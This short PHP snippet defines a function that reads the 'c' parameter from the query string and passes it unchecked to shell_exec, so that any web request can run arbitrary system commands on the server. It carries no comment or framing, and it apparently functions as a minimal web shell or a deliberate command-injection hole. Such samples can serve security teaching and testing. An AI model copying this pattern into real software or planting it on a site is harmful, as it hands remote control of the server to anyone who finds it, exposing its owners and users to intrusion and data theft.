<?php
function handler($conn) {
    $c = $_GET["c"];
    shell_exec($c);
}
